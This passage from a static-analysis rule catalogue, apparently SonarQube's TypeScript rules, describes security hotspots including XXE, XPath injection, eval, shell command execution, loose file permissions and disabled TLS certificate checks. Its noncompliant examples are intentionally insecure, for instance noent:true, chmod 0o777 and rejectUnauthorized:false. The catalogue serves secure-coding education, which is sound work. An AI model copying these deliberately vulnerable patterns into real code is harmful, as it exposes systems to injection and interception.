        "htmlDesc": "<p>This rule is deprecated; use <a href='/coding_rules#rule_key=javascript%3AS4507'>S4507</a> instead.</p>\n<h2>Why is this an issue?</h2>\n<p>The debugger statement can be placed anywhere in procedures to suspend execution. Using the debugger statement is similar to setting a breakpoint\nin the code. By definition such statement must absolutely be removed from the source code to prevent any unexpected behavior or added vulnerability to\nattacks in production.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nfor (i = 1; i&lt;5; i++) {\n  // Print i to the Output window.\n  Debug.write(\"loop index is \" + i);\n  // Wait for user to resume.\n  debugger;\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nfor (i = 1; i&lt;5; i++) {\n  // Print i to the Output window.\n  Debug.write(\"loop index is \" + i);\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/489\">CWE-489 - Active Debug Code</a> </li>\n</ul>",
        "severity": "MINOR"
      },
      "typescript:S2612": {
        "name": "Setting loose POSIX file permissions is security-sensitive",
        "htmlDesc": "<p>In Unix file system permissions, the \"<code>others</code>\" category refers to all users except the owner of the file system resource and the\nmembers of the group assigned to this resource.</p>\n<p>Granting permissions to this category can lead to unintended access to files or directories that could allow attackers to obtain sensitive\ninformation, disrupt services or elevate privileges.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The application is designed to be run on a multi-user environment. </li>\n  <li> Corresponding files and directories may contain confidential information. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>The most restrictive possible permissions should be assigned to files and directories.</p>\n<h2>Sensitive Code Example</h2>\n<p>Node.js <a href=\"https://nodejs.org/api/fs.html\"><code>fs</code></a></p>\n<pre>\nconst fs = require('fs');\n\nfs.chmodSync(\"/tmp/fs\", 0o777); // Sensitive\n</pre>\n<pre>\nconst fs = require('fs');\nconst fsPromises = fs.promises;\n\nfsPromises.chmod(\"/tmp/fsPromises\", 0o777); // Sensitive\n</pre>\n<pre>\nconst fs = require('fs');\nconst fsPromises = fs.promises\n\nasync function fileHandler() {\n  let filehandle;\n  try {\n    filehandle = fsPromises.open('/tmp/fsPromises', 'r');\n    filehandle.chmod(0o777); // Sensitive\n  } finally {\n    if (filehandle !== undefined)\n      filehandle.close();\n  }\n}\n</pre>\n<p>Node.js <a href=\"https://nodejs.org/api/process.html#process_process_umask_mask\"><code>process.umask</code></a></p>\n<pre>\nconst process = require('process');\n\nprocess.umask(0o000); // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<p>Node.js <a href=\"https://nodejs.org/api/fs.html\"><code>fs</code></a></p>\n<pre>\nconst fs = require('fs');\n\nfs.chmodSync(\"/tmp/fs\", 0o770); // Compliant\n</pre>\n<pre>\nconst fs = require('fs');\nconst fsPromises = fs.promises;\n\nfsPromises.chmod(\"/tmp/fsPromises\", 0o770); // Compliant\n</pre>\n<pre>\nconst fs = require('fs');\nconst fsPromises = fs.promises\n\nasync function fileHandler() {\n  let filehandle;\n  try {\n    filehandle = fsPromises.open('/tmp/fsPromises', 'r');\n    filehandle.chmod(0o770); // Compliant\n  } finally {\n    if (filehandle !== undefined)\n      filehandle.close();\n  }\n}\n</pre>\n<p>Node.js <a href=\"https://nodejs.org/api/process.html#process_process_umask_mask\"><code>process.umask</code></a></p>\n<pre>\nconst process = require('process');\n\nprocess.umask(0o007); // Compliant\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A04_2021-Insecure_Design/\">Top 10 2021 Category A4 - Insecure Design</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\">Top 10 2017 Category A5 - Broken Access Control</a>\n  </li>\n  <li> <a\n  href=\"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission\">OWASP File Permission</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/732\">CWE-732 - Incorrect Permission Assignment for Critical Resource</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/266\">CWE-266 - Incorrect Privilege Assignment</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "typescript:S2755": {
        "name": "XML parsers should not be vulnerable to XXE attacks",
        "htmlDesc": "<p>This vulnerability allows the usage of external entities in XML.</p>\n<h2>Why is this an issue?</h2>\n<p>External Entity Processing allows for XML parsing with the involvement of external entities. However, when this functionality is enabled without\nproper precautions, it can lead to a vulnerability known as XML External Entity (XXE) attack.</p>\n<h3>What is the potential impact?</h3>\n<h4>Exposing sensitive data</h4>\n<p>One significant danger of XXE vulnerabilities is the potential for sensitive data exposure. By crafting malicious XML payloads, attackers can\nreference external entities that contain sensitive information, such as system files, database credentials, or configuration files. When these\nentities are processed during XML parsing, the attacker can extract the contents and gain unauthorized access to sensitive data. This poses a severe\nthreat to the confidentiality of critical information.</p>\n<h4>Exhausting system resources</h4>\n<p>Another consequence of XXE vulnerabilities is the potential for denial-of-service attacks. By exploiting the ability to include external entities,\nattackers can construct XML payloads that cause resource exhaustion. This can overwhelm the system’s memory, CPU, or other critical resources, leading\nto system unresponsiveness or crashes. A successful DoS attack can disrupt the availability of services and negatively impact the user experience.</p>\n<h4>Forging requests</h4>\n<p>XXE vulnerabilities can also enable Server-Side Request Forgery (SSRF) attacks. By leveraging the ability to include external entities, an attacker\ncan make the vulnerable application send arbitrary requests to other internal or external systems. This can result in unintended actions, such as\nretrieving data from internal resources, scanning internal networks, or attacking other systems. SSRF attacks can lead to severe consequences,\nincluding unauthorized data access, system compromise, or even further exploitation within the network infrastructure.</p>\n<h2>How to fix it in libxmljs</h2>\n<h3>Code examples</h3>\n<p>The following code contains examples of XML parsers that have external entity processing enabled. As a result, the parsers are vulnerable to XXE\nattacks if an attacker can control the XML file that is processed.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nvar libxmljs = require('libxmljs');\nvar fs = require('fs');\n\nvar xml = fs.readFileSync('xxe.xml', 'utf8');\nlibxmljs.parseXmlString(xml, {\n    noblanks: true,\n    noent: true, // Noncompliant\n    nocdata: true\n});\n</pre>\n<h4>Compliant solution</h4>\n<p><code>parseXmlString</code> is safe by default.</p>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nvar libxmljs = require('libxmljs');\nvar fs = require('fs');\n\nvar xml = fs.readFileSync('xxe.xml', 'utf8');\nlibxmljs.parseXmlString(xml);\n</pre>\n<h3>How does this work?</h3>\n<h4>Disable external entities</h4>\n<p>The most effective approach to prevent XXE vulnerabilities is to disable external entity processing entirely, unless it is explicitly required for\nspecific use cases. By default, XML parsers should be configured to reject the processing of external entities. This can be achieved by setting the\nappropriate properties or options in your XML parser library or framework.</p>\n<p>If external entity processing is necessary for certain scenarios, adopt a whitelisting approach to restrict the entities that can be resolved\nduring XML parsing. Create a list of trusted external entities and disallow all others. This approach ensures that only known and safe entities are\nprocessed.<br> You should rely on features provided by your XML parser to restrict the external entities.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A4_2017-XML_External_Entities_(XXE)\">Top 10 2017 Category A4 - XML External\n  Entities (XXE)</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/611\">CWE-611 - Information Exposure Through XML External Entity Reference</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/827\">CWE-827 - Improper Control of Document Type Definition</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "typescript:S4817": {
        "name": "Executing XPath expressions is security-sensitive",
        "htmlDesc": "<p>This rule is deprecated, and will eventually be removed.</p>\n<p>Executing XPATH expressions is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6272\">CVE-2016-6272</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-9149\">CVE-2016-9149</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-4837\">CVE-2012-4837</a> </li>\n</ul>\n<p>User-provided data such as URL parameters should always be considered as untrusted and tainted. Constructing XPath expressions directly from\ntainted data enables attackers to inject specially crafted values that changes the initial meaning of the expression itself. Successful XPath\ninjections attacks can read sensitive information from the XML document.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> the XPATH expression might contain some unsafe input coming from a user. </li>\n</ul>\n<p>You are at risk if you answered yes to this question.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Sanitize any user input before using it in an XPATH expression.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\n// === Server side ===\n\nvar xpath = require('xpath');\nvar xmldom = require('xmldom');\n\nvar doc = new xmldom.DOMParser().parseFromString(xml);\nvar nodes = xpath.select(userinput, doc); // Sensitive\nvar node = xpath.select1(userinput, doc); // Sensitive\n</pre>\n<pre>\n// === Client side ===\n\n// Chrome, Firefox, Edge, Opera, and Safari use the evaluate() method to select nodes:\nvar nodes = document.evaluate(userinput, xmlDoc, null, XPathResult.ANY_TYPE, null); // Sensitive\n\n// Internet Explorer uses its own methods to select nodes:\nvar nodes = xmlDoc.selectNodes(userinput); // Sensitive\nvar node = xmlDoc.SelectSingleNode(userinput); // Sensitive\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/643\">CWE-643 - Improper Neutralization of Data within XPath Expressions</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "typescript:S4818": {
        "name": "Using Sockets is security-sensitive",
        "htmlDesc": "<p>This rule is deprecated, and will eventually be removed.</p>\n<p>Using sockets is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-1785\">CVE-2011-178</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5645\">CVE-2017-5645</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-6597\">CVE-2018-6597</a> </li>\n</ul>\n<p>Sockets are vulnerable in multiple ways:</p>\n<ul>\n  <li> They enable a software to interact with the outside world. As this world is full of attackers it is necessary to check that they cannot receive\n  sensitive information or inject dangerous input. </li>\n  <li> The number of sockets is limited and can be exhausted. Which makes the application unresponsive to users who need additional sockets. </li>\n</ul>\n<p>This rules flags code that creates sockets. It matches only the direct use of sockets, not use through frameworks or high-level APIs such as the\nuse of http connections.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> sockets are created without any limit every time a user performs an action. </li>\n  <li> input received from sockets is used without being sanitized. </li>\n  <li> sensitive data is sent via sockets without being encrypted. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> In many cases there is no need to open a socket yourself. Use instead libraries and existing protocols. </li>\n  <li> Encrypt all data sent if it is sensitive. Usually it is better to encrypt it even if the data is not sensitive as it might change later. </li>\n  <li> <a href=\"https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet\">Sanitize</a> any input read from the socket. </li>\n  <li> Limit the number of sockets a given user can create. Close the sockets as soon as possible. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\nconst net = require('net');\n\nvar socket = new net.Socket(); // Sensitive\nsocket.connect(80, 'google.com');\n\n// net.createConnection creates a new net.Socket, initiates connection with socket.connect(), then returns the net.Socket that starts the connection\nnet.createConnection({ port: port }, () =&gt; {}); // Sensitive\n\n// net.connect is an alias to net.createConnection\nnet.connect({ port: port }, () =&gt; {}); // Sensitive\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/400\">CWE-400 - Uncontrolled Resource Consumption ('Resource Exhaustion')</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/200\">CWE-200 - Exposure of Sensitive Information to an Unauthorized Actor</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "typescript:S1313": {
        "name": "Using hardcoded IP addresses is security-sensitive",
        "htmlDesc": "<p>Hardcoding IP addresses is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-5901\">CVE-2006-5901</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3725\">CVE-2005-3725</a> </li>\n</ul>\n<p>Today’s services have an ever-changing architecture due to their scaling and redundancy needs. It is a mistake to think that a service will always\nhave the same IP address. When it does change, the hardcoded IP will have to be modified too. This will have an impact on the product development,\ndelivery, and deployment:</p>\n<ul>\n  <li> The developers will have to do a rapid fix every time this happens, instead of having an operation team change a configuration file. </li>\n  <li> It misleads to use the same address in every environment (dev, sys, qa, prod). </li>\n</ul>\n<p>Last but not least it has an effect on application security. Attackers might be able to decompile the code and thereby discover a potentially\nsensitive address. They can perform a Denial of Service attack on the service, try to get access to the system, or try to spoof the IP address to\nbypass security checks. Such attacks can always be possible, but in the case of a hardcoded IP address solving the issue will take more time, which\nwill increase an attack’s impact.</p>\n<h2>Ask Yourself Whether</h2>\n<p>The disclosed IP address is sensitive, e.g.:</p>\n<ul>\n  <li> Can give information to an attacker about the network topology. </li>\n  <li> It’s a personal (assigned to an identifiable person) IP address. </li>\n</ul>\n<p>There is a risk if you answered yes to any of these questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Don’t hard-code the IP address in the source code, instead make it configurable with environment variables, configuration files, or a similar\napproach. Alternatively, if confidentially is not required a domain name can be used since it allows to change the destination quickly without having\nto rebuild the software.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nip = \"192.168.12.42\"; // Sensitive\n\nconst net = require('net');\nvar client = new net.Socket();\nclient.connect(80, ip, function() {\n  // ...\n});\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nip = process.env.IP_ADDRESS; // Compliant\n\nconst net = require('net');\nvar client = new net.Socket();\nclient.connect(80, ip, function() {\n  // ...\n});\n</pre>\n<h2>Exceptions</h2>\n<p>No issue is reported for the following cases because they are not considered sensitive:</p>\n<ul>\n  <li> Loopback addresses 127.0.0.0/8 in CIDR notation (from 127.0.0.0 to 127.255.255.255) </li>\n  <li> Broadcast address 255.255.255.255 </li>\n  <li> Non routable address 0.0.0.0 </li>\n  <li> Strings of the form <code>2.5.&lt;number&gt;.&lt;number&gt;</code> as they <a href=\"http://www.oid-info.com/introduction.htm\">often match\n  Object Identifiers</a> (OID). </li>\n  <li> Addresses in the ranges 192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24, reserved for documentation purposes by <a\n  href=\"https://datatracker.ietf.org/doc/html/rfc5737\">RFC 5737</a> </li>\n  <li> Addresses in the 2001:db8::/32 range, reserved for documentation purposes by <a href=\"https://datatracker.ietf.org/doc/html/rfc3849\">RFC\n  3849</a> </li>\n</ul>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n</ul>",
        "severity": "MINOR"
      },
      "typescript:S1523": {
        "name": "Dynamically executing code is security-sensitive",
        "htmlDesc": "<p>Executing code dynamically is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9807\">CVE-2017-9807</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9802\">CVE-2017-9802</a> </li>\n</ul>\n<p>Some APIs enable the execution of dynamic code by providing it as strings at runtime. These APIs might be useful in some very specific\nmeta-programming use-cases. However most of the time their use is frowned upon as they also increase the risk of <a\nhref=\"https://owasp.org/www-community/attacks/Code_Injection\">Injected Code</a>. Such attacks can either run on the server or in the client (exemple:\nXSS attack) and have a huge impact on an application’s security.</p>\n<p>This rule raises issues on calls to <code>eval</code> and <code>Function</code> constructor. This rule does not detect code injections. It only\nhighlights the use of APIs which should be used sparingly and very carefully. The goal is to guide security code reviews.</p>\n<p>The rule also flags string literals starting with <code>javascript:</code> as the code passed in <code>javascript:</code> URLs is evaluated the\nsame way as calls to <code>eval</code> or <code>Function</code> constructor.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> the executed code may come from an untrusted source and hasn’t been sanitized. </li>\n  <li> you really need to run code dynamically. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Regarding the execution of unknown code, the best solution is to not run code provided by an untrusted source. If you really need to do it, run the\ncode in a <a href=\"https://en.wikipedia.org/wiki/Sandbox_(computer_security)\">sandboxed</a> environment. Use jails, firewalls and whatever means your\noperating system and programming language provide (example: <a\nhref=\"https://wiki.sei.cmu.edu/confluence/display/java/SEC54-J.+Create+a+secure+sandbox+using+a+security+manager\">Security Managers</a> in java, <a\nhref=\"https://www.w3schools.com/tags/att_iframe_sandbox.asp\">iframes</a> and <a href=\"https://en.wikipedia.org/wiki/Same-origin_policy\">same-origin\npolicy</a> for javascript in a web browser).</p>\n<p>Do not try to create a blacklist of dangerous code. It is impossible to cover all attacks that way.</p>\n<p>Avoid using dynamic code APIs whenever possible. Hard-coded code is always safer.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nlet value = eval('obj.' + propName); // Sensitive\nlet func = Function('obj' + propName); // Sensitive\nlocation.href = 'javascript:void(0)'; // Sensitive\n</pre>\n<h2>Exceptions</h2>\n<p>This rule will not raise an issue when the argument of the <code>eval</code> or <code>Function</code> is a literal string as it is reasonably\nsafe.</p>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/95\">CWE-95 - Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval\n  Injection')</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "typescript:S4721": {
        "name": "Using shell interpreter when executing OS commands is security-sensitive",
        "htmlDesc": "<p>Arbitrary OS command injection vulnerabilities are more likely when a shell is spawned rather than a new process, indeed shell meta-chars can be\nused (when parameters are user-controlled for instance) to inject OS commands.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> OS command name or parameters are user-controlled. </li>\n</ul>\n<p>There is a risk if you answered yes to this question.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Use functions that don’t spawn a shell.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nconst cp = require('child_process');\n\n// A shell will be spawn in these following cases:\ncp.exec(cmd); // Sensitive\ncp.execSync(cmd); // Sensitive\n\ncp.spawn(cmd, { shell: true }); // Sensitive\ncp.spawnSync(cmd, { shell: true }); // Sensitive\ncp.execFile(cmd, { shell: true }); // Sensitive\ncp.execFileSync(cmd, { shell: true }); // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nconst cp = require('child_process');\n\ncp.spawnSync(\"/usr/bin/file.exe\", { shell: false }); // Compliant\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/78\">CWE-78 - Improper Neutralization of Special Elements used in an OS Command</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "typescript:S4823": {
        "name": "Using command line arguments is security-sensitive",
        "htmlDesc": "<p>This rule is deprecated, and will eventually be removed.</p>\n<p>Using command line arguments is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7281\">CVE-2018-7281</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12326\">CVE-2018-12326</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3198\">CVE-2011-3198</a> </li>\n</ul>\n<p>Command line arguments can be dangerous just like any other user input. They should never be used without being first validated and sanitized.</p>\n<p>Remember also that any user can retrieve the list of processes running on a system, which makes the arguments provided to them visible. Thus\npassing sensitive information via command line arguments should be considered as insecure.</p>\n<p>This rule raises an issue when on every program entry points (<code>main</code> methods) when command line arguments are used. The goal is to guide\nsecurity code reviews.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> any of the command line arguments are used without being sanitized first. </li>\n  <li> your application accepts sensitive information via command line arguments. </li>\n</ul>\n<p>If you answered yes to any of these questions you are at risk.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p><a href=\"https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet\">Sanitize</a> all command line arguments before using them.</p>\n<p>Any user or application can list running processes and see the command line arguments they were started with. There are safer ways of providing\nsensitive information to an application than exposing them in the command line. It is common to write them on the process' standard input, or give the\npath to a file containing the information.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\n// The process object is a global that provides information about, and control over, the current Node.js process\nvar param = process.argv[2]; // Sensitive: check how the argument is used\nconsole.log('Param: ' + param);\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/88\">CWE-88 - Argument Injection or Modification</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/214\">CWE-214 - Information Exposure Through Process Environment</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "typescript:S4829": {
        "name": "Reading the Standard Input is security-sensitive",
        "htmlDesc": "<p>This rule is deprecated, and will eventually be removed.</p>\n<p>Reading Standard Input is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-2337\">CVE-2005-2337</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11449\">CVE-2017-11449</a> </li>\n</ul>\n<p>It is common for attackers to craft inputs enabling them to exploit software vulnerabilities. Thus any data read from the standard input (stdin)\ncan be dangerous and should be validated.</p>\n<p>This rule flags code that reads from the standard input.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> data read from the standard input is not sanitized before being used. </li>\n</ul>\n<p>You are at risk if you answered yes to this question.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p><a href=\"https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet\">Sanitize</a> all data read from the standard input before using it.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\n// The process object is a global that provides information about, and control over, the current Node.js process\n// All uses of process.stdin are security-sensitive and should be reviewed\n\nprocess.stdin.on('readable', () =&gt; {\n\tconst chunk = process.stdin.read(); // Sensitive\n\tif (chunk !== null) {\n\t\tdosomething(chunk);\n\t}\n});\n\nconst readline = require('readline');\nreadline.createInterface({\n\tinput: process.stdin // Sensitive\n}).on('line', (input) =&gt; {\n\tdosomething(input);\n});\n</pre>\n<h2>See</h2>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "typescript:S4830": {
        "name": "Server certificates should be verified during SSL/TLS connections",
        "htmlDesc": "<p>This vulnerability makes it possible that an encrypted communication is intercepted.</p>\n<h2>Why is this an issue?</h2>\n<p>Transport Layer Security (TLS) provides secure communication between systems over the internet by encrypting the data sent between them.\nCertificate validation adds an extra layer of trust and security to this process to ensure that a system is indeed the one it claims to be.</p>\n<p>When certificate validation is disabled, the client skips a critical security check. This creates an opportunity for attackers to pose as a trusted\nentity and intercept, manipulate, or steal the data being transmitted.</p>\n<h3>What is the potential impact?</h3>\n<p>Establishing trust in a secure way is a non-trivial task. When you disable certificate validation, you are removing a key mechanism designed to\nbuild this trust in internet communication, opening your system up to a number of potential threats.</p>\n<h4>Identity spoofing</h4>\n<p>If a system does not validate certificates, it cannot confirm the identity of the other party involved in the communication. An attacker can\nexploit this by creating a fake server and masquerading as a legitimate one. For example, they might set up a server that looks like your bank’s\nserver, tricking your system into thinking it is communicating with the bank. This scenario, called identity spoofing, allows the attacker to collect\nany data your system sends to them, potentially leading to significant data breaches.</p>\n<h4>Loss of data integrity</h4>\n<p>When TLS certificate validation is disabled, the integrity of the data you send and receive cannot be guaranteed. An attacker could modify the data\nin transit, and you would have no way of knowing. This could range from subtle manipulations of the data you receive to the injection of malicious\ncode or malware into your system. The consequences of such breaches of data integrity can be severe, depending on the nature of the data and the\nsystem.</p>\n<h2>How to fix it in Node.js</h2>\n<h3>Code examples</h3>\n<p>The following code contains examples of disabled certificate validation.</p>\n<p>The certificate validation gets disabled by setting <code>rejectUnauthorized</code> to <code>false</code>. To enable validation set the value to\n<code>true</code> or do not set <code>rejectUnauthorized</code> at all to use the secure default value.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nconst https = require('node:https');\n\nlet options = {\n  hostname: 'www.example.com',\n  port: 443,\n  path: '/',\n  method: 'GET',\n  rejectUnauthorized: false,\n  secureProtocol: 'TLSv1_2_method'\n};\n\nlet req = https.request(options, (res) =&gt; {\n  res.on('data', (d) =&gt; {\n    process.stdout.write(d);\n  });\n}); // Noncompliant\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\nconst tls = require('node:tls');\n\nlet options = {\n    rejectUnauthorized: false,\n    secureProtocol: 'TLSv1_2_method'\n};\n\nlet socket = tls.connect(443, \"www.example.com\", options, () =&gt; {\n  process.stdin.pipe(socket);\n  process.stdin.resume();\n}); // Noncompliant\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nconst https = require('node:https');\n\nlet options = {\n  hostname: 'www.example.com',\n  port: 443,\n  path: '/',\n  method: 'GET',\n  secureProtocol: 'TLSv1_2_method'\n};\n\nlet req = https.request(options, (res) =&gt; {\n  res.on('data', (d) =&gt; {\n    process.stdout.write(d);\n  });\n});\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\nconst tls = require('node:tls');\n\nlet options = {\n    secureProtocol: 'TLSv1_2_method'\n};\n\nlet socket = tls.connect(443, \"www.example.com\", options, () =&gt; {\n  process.stdin.pipe(socket);\n  process.stdin.resume();\n});\n</pre>\n<h3>How does this work?</h3>\n<p>Addressing the vulnerability of disabled TLS certificate validation primarily involves re-enabling the default validation.</p>\n<p>To avoid running into problems with invalid certificates, consider the following sections.</p>\n<h4>Using trusted certificates</h4>\n<p>If possible, always use a certificate issued by a well-known, trusted CA for your server. Most programming environments come with a predefined list\nof trusted root CAs, and certificates issued by these authorities are validated automatically. This is the best practice, and it requires no\nadditional code or configuration.</p>\n<h4>Working with self-signed certificates or non-standard CAs</h4>\n<p>In some cases, you might need to work with a server using a self-signed certificate, or a certificate issued by a CA not included in your trusted\nroots. Rather than disabling certificate validation in your code, you can add the necessary certificates to your trust store.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  